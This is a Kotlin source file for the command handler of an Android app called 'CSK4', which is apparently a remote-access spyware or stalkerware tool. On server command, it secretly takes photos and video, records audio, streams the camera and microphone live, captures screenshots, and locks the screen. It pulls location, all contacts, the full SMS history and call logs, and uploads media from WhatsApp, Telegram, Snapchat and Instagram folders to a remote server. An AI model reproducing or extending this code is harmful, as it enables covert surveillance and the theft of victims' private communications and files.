package com.csk4.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Location
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.location.LocationServices
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream

class CommandHandler(private val ctx: Context, private val deviceId: String) {

    private val TAG = "CSK4_CMD"
    private var webrtc: WebRTCService? = null

    fun execute(command: String, params: JSONObject, onDone: (String) -> Unit) {
        Log.d(TAG, "Exec: $command")
        when (command) {
            "take_photo_back" -> takePhoto(false, onDone)
            "take_photo_front" -> takePhoto(true, onDone)
            "record_video_back" -> recordVideo(false, params.optInt("duration", 10), onDone)
            "record_video_front" -> recordVideo(true, params.optInt("duration", 10), onDone)
            "record_audio" -> recordAudio(params.optInt("duration", 10), onDone)
            "screenshot" -> takeScreenshot(onDone)
            "lock_screen" -> { lockScreen(); onDone("locked") }
            "get_bluetooth" -> handleBluetooth(onDone)
            "start_webrtc" -> {
                webrtc?.stop()
                webrtc = WebRTCService(ctx, deviceId).apply {
                    start(cameraFacing = false, audioOnly = false) { s -> Log.d(TAG, s) }
                }
                onDone("webrtc_started")
            }
            "start_audio_stream" -> {
                webrtc?.stop()
                webrtc = WebRTCService(ctx, deviceId).apply {
                    start(cameraFacing = false, audioOnly = true) { s -> Log.d(TAG, s) }
                }
                onDone("audio_started")
            }
            "stop_webrtc" -> { webrtc?.stop(); webrtc = null; onDone("stopped") }
            "switch_camera" -> { webrtc?.switchCamera(); onDone("switched") }
            "get_location" -> { handleLocation(); onDone("loc_sent") }
            "get_contacts" -> { handleContacts(); onDone("contacts_sent") }
            "get_messages" -> { handleMessages(); onDone("sms_sent") }
            "get_calllogs" -> { handleCallLogs(); onDone("calls_sent") }
            "get_files" -> { handleFiles(); onDone("files_sent") }
            "get_apps" -> { handleApps(); onDone("apps_sent") }
            "get_nearby" -> { onDone("nearby") }
            "get_info" -> { handleDeviceInfo(); onDone("info_sent") }
            "vibrate" -> { vibrate(); onDone("vibrated") }
            "play_sound" -> { playSound(); onDone("played") }
            "flashlight_on" -> { flashlight(true); onDone("on") }
            "flashlight_off" -> { flashlight(false); onDone("off") }
            else -> onDone("unknown: $command")
        }
    }

    private fun takePhoto(front: Boolean, onDone: (String) -> Unit) {
        if (webrtc != null) {
            webrtc?.stop()
            webrtc = null
            Handler(Looper.getMainLooper()).postDelayed({
                CameraController(ctx).capturePhoto(front) { file, err ->
                    if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
                    else onDone("photo_fail: $err")
                }
            }, 2000)
        } else {
            CameraController(ctx).capturePhoto(front) { file, err ->
                if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
                else onDone("photo_fail: $err")
            }
        }
    }

    private fun recordVideo(front: Boolean, duration: Int, onDone: (String) -> Unit) {
        if (webrtc != null) {
            webrtc?.stop()
            webrtc = null
            Handler(Looper.getMainLooper()).postDelayed({
                VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
                    if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
                    else onDone("video_fail: $err")
                }
            }, 2000)
        } else {
            VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
                if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
                else onDone("video_fail: $err")
            }
        }
    }

    private fun recordAudio(duration: Int, onDone: (String) -> Unit) {
        AudioRecorder(ctx).record(duration) { file, err ->
            if (file != null) { uploadFile(file, "audio"); onDone("audio_ok") }
            else onDone("audio_fail: $err")
        }
    }

    private fun takeScreenshot(onDone: (String) -> Unit) {
        val svc = ScreenshotService.instance
        if (svc == null) {
            onDone("Accessibility_NOT_enabled. Settings > Accessibility > CSK4 ON karein")
            return
        }
        if (Build.VERSION.SDK_INT < 30) { onDone("needs_android_11"); return }
        svc.takeScreenshot { file, err ->
            if (file != null) { uploadFile(file, "screenshot"); onDone("ss_ok") }
            else onDone("ss_fail: $err")
        }
    }

    private fun lockScreen() {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) dpm.lockNow()
        } catch (e: Exception) { Log.e(TAG, "Lock: ${e.message}") }
    }

    private fun handleBluetooth(onDone: (String) -> Unit) {
        BluetoothScanner(ctx).scan { arr ->
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("devices", arr)
                put("token", Config.DEVICE_TOKEN)
            }
            post("${Config.SERVER_URL}/api/device/bluetooth", json)
            onDone("bt_${arr.length()}")
        }
    }

    fun handleLocation() {
        if (!hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)) return
        try {
            LocationServices.getFusedLocationProviderClient(ctx).lastLocation
                .addOnSuccessListener { loc: Location? ->
                    loc?.let {
                        val json = JSONObject().apply {
                            put("deviceId", deviceId)
                            put("lat", it.latitude)
                            put("lng", it.longitude)
                            put("accuracy", it.accuracy)
                            put("token", Config.DEVICE_TOKEN)
                        }
                        post("${Config.SERVER_URL}/api/device/location", json)
                    }
                }
        } catch (e: SecurityException) {}
    }

    // ============ CONTACTS - FULL DATA ============
    fun handleContacts() {
        if (!hasPerm(Manifest.permission.READ_CONTACTS)) return
        val arr = JSONArray()

        // Get ALL contacts with phone numbers - use Phone.CONTENT_URI
        val cur = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )

        cur?.use {
            while (it.moveToNext()) {
                try {
                    val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    val typeIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                    val emailIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)

                    val name = if (nameIdx >= 0) it.getString(nameIdx) ?: "Unknown" else "Unknown"
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) ?: "" else ""
                    val type = if (typeIdx >= 0) it.getInt(typeIdx) else 0
                    val contactId = if (emailIdx >= 0) it.getString(emailIdx) ?: "" else ""

                    if (phone.isNotEmpty()) {
                        arr.put(JSONObject().apply {
                            put("name", name)
                            put("phone", phone)
                            put("type", when(type) {
                                1 -> "Home"
                                2 -> "Mobile"
                                3 -> "Work"
                                else -> "Other"
                            })
                            put("contactId", contactId)
                        })
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Contact parse err: ${e.message}")
                }
            }
        }

        Log.d(TAG, "Contacts count: ${arr.length()}")

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("contacts", arr)
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/contacts", json)
    }

    // ============ MESSAGES - FULL HISTORY ============
    private fun handleMessages() {
        if (!hasPerm(Manifest.permission.READ_SMS)) return
        val arr = JSONArray()

        // Get ALL SMS - no limit, sorted by date (newest first)
        val cur = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null,
            Telephony.Sms.DATE + " DESC"
        )

        cur?.use {
            while (it.moveToNext()) {
                try {
                    val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                    val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                    val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)
                    val readIdx = it.getColumnIndex(Telephony.Sms.READ)

                    val address = if (addrIdx >= 0) it.getString(addrIdx) ?: "Unknown" else "Unknown"
                    val body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else ""
                    val date = if (dateIdx >= 0) it.getString(dateIdx) ?: "0" else "0"
                    val type = if (typeIdx >= 0) it.getInt(typeIdx) else 1
                    val read = if (readIdx >= 0) it.getInt(readIdx) else 0

                    arr.put(JSONObject().apply {
                        put("from", address)
                        put("body", body)
                        put("time", date)
                        put("type", when(type) {
                            1 -> "inbox"
                            2 -> "sent"
                            3 -> "draft"
                            4 -> "outbox"
                            5 -> "failed"
                            6 -> "queued"
                            else -> "unknown"
                        })
                        put("read", read == 1)
                    })
                } catch (e: Exception) {
                    Log.e(TAG, "SMS parse err: ${e.message}")
                }
            }
        }

        Log.d(TAG, "SMS count: ${arr.length()}")

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("messages", arr)
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/messages", json)
    }

    // ============ CALL LOGS - FULL ============
    private fun handleCallLogs() {
        if (!hasPerm(Manifest.permission.READ_CALL_LOG)) return
        val arr = JSONArray()

        val cur = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null,
            CallLog.Calls.DATE + " DESC"
        )

        cur?.use {
            while (it.moveToNext()) {
                try {
                    arr.put(JSONObject().apply {
                        put("number", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                        put("name", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown")
                        put("type", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                        put("duration", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                        put("time", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                    })
                } catch (e: Exception) {
                    Log.e(TAG, "Call log err: ${e.message}")
                }
            }
        }

        Log.d(TAG, "Call logs count: ${arr.length()}")

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("callLogs", arr)
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/calllogs", json)
    }

    // ============ FILES - COMPLETE STORAGE SCAN ============
    private fun handleFiles() {
        try {
            // Complete storage scan - all common locations
            val dirs = listOf(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                File("/storage/emulated/0/WhatsApp/Media"),
                File("/storage/emulated/0/Telegram"),
                File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
                File("/storage/emulated/0/MIUI/Gallery"),
                File("/storage/emulated/0/Snapchat"),
                File("/storage/emulated/0/Instagram"),
                File("/storage/emulated/0/Pictures/Screenshots"),
                File("/storage/emulated/0/DCIM/Camera"),
                File("/storage/emulated/0/DCIM/Screenshots"),
                File("/storage/emulated/0/Download")
            )

            var uploaded = 0
            var scanned = 0
            val maxFiles = 500

            dirs.forEach { dir ->
                if (!dir.exists()) return@forEach
                try {
                    dir.walkTopDown().take(maxFiles).forEach { f ->
                        scanned++
                        if (f.isFile && f.length() < 20 * 1024 * 1024) {
                            val ext = f.extension.lowercase()
                            if (ext in listOf("jpg", "jpeg", "png", "gif", "webp", "mp4", "mov", "3gp", "mkv", "pdf", "doc", "docx")) {
                                val type = when (ext) {
                                    "jpg", "jpeg", "png", "gif", "webp" -> "photo"
                                    "mp4", "mov", "3gp", "mkv" -> "video"
                                    else -> "file"
                                }
                                uploadFile(f, type)
                                uploaded++
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Dir scan err: ${e.message}")
                }
            }
            Log.d(TAG, "Files scanned: $scanned, uploaded: $uploaded")
        } catch (e: Exception) {
            Log.e(TAG, "handleFiles err: ${e.message}")
        }
    }

    private fun handleApps() {
        try {
            val pm = ctx.packageManager
            val arr = JSONArray()
            pm.getInstalledApplications(0).forEach { app ->
                arr.put(JSONObject().apply {
                    put("name", pm.getApplicationLabel(app).toString())
                    put("package", app.packageName)
                })
            }
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("apps", arr)
                put("token", Config.DEVICE_TOKEN)
            }
            post("${Config.SERVER_URL}/api/device/apps", json)
        } catch (_: Exception) {}
    }

    private fun handleDeviceInfo() {
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("info", JSONObject().apply {
                put("model", Build.MODEL)
                put("brand", Build.BRAND)
                put("manufacturer", Build.MANUFACTURER)
                put("android", Build.VERSION.RELEASE)
                put("sdk", Build.VERSION.SDK_INT)
                put("cpu", Build.HARDWARE)
                put("device", Build.DEVICE)
                put("fingerprint", Build.FINGERPRINT)
                put("totalRAM", getTotalRAM())
                put("availableRAM", getAvailableRAM())
                put("totalStorage", getTotalStorage())
                put("availableStorage", getAvailableStorage())
            })
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/info", json)
    }

    private fun vibrate() {
        try {
            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(1500, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION") v.vibrate(1500)
            }
        } catch (_: Exception) {}
    }

    private fun flashlight(on: Boolean) {
        try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { cid ->
                cm.getCameraCharacteristics(cid).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return
            cm.setTorchMode(id, on)
        } catch (_: Exception) {}
    }

    private fun playSound() {
        try {
            val r = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
            android.media.RingtoneManager.getRingtone(ctx, r).play()
        } catch (_: Exception) {}
    }

    private fun hasPerm(p: String): Boolean =
        ActivityCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    private fun post(url: String, json: JSONObject) {
        Volley.newRequestQueue(ctx).add(JsonObjectRequest(
            Request.Method.POST, url, json,
            { Log.d(TAG, "Posted: $url") }, { Log.e(TAG, "Post fail: ${it.message}") }
        ))
    }

    private fun uploadFile(file: File, type: String) {
        try {
            val url = "${Config.SERVER_URL}/api/device/upload"
            val req = object : com.android.volley.VolleyMultipartRequest(
                Request.Method.POST, url,
                { Log.d(TAG, "✅ Uploaded: ${file.name}") },
                { Log.e(TAG, "Upload fail: ${it.message}") }
            ) {
                override fun getByteData(): MutableMap<String, DataPart> {
                    return hashMapOf("file" to DataPart(file.name, readFile(file)))
                }
                override fun getParams(): MutableMap<String, String> {
                    return hashMapOf(
                        "deviceId" to deviceId,
                        "type" to type,
                        "token" to Config.DEVICE_TOKEN
                    )
                }
            }
            Volley.newRequestQueue(ctx).add(req)
        } catch (e: Exception) { Log.e(TAG, "Upload err: ${e.message}") }
    }

    private fun readFile(file: File): ByteArray {
        val fis = FileInputStream(file)
        val b = fis.readBytes()
        fis.close()
        return b
    }

    private fun getTotalRAM(): Long {
        val mi = android.app.ActivityManager.MemoryInfo()
        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
        return mi.totalMem / (1024 * 1024)
    }

    private fun getAvailableRAM(): Long {
        val mi = android.app.ActivityManager.MemoryInfo()
        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
        return mi.availMem / (1024 * 1024)
    }

    private fun getTotalStorage(): Long {
        val s = android.os.StatFs(Environment.getDataDirectory().path)
        return (s.blockCountLong * s.blockSizeLong) / (1024 * 1024)
    }

    private fun getAvailableStorage(): Long {
        val s = android.os.StatFs(Environment.getDataDirectory().path)
        return (s.availableBlocksLong * s.blockSizeLong) / (1024 * 1024)
    }
}
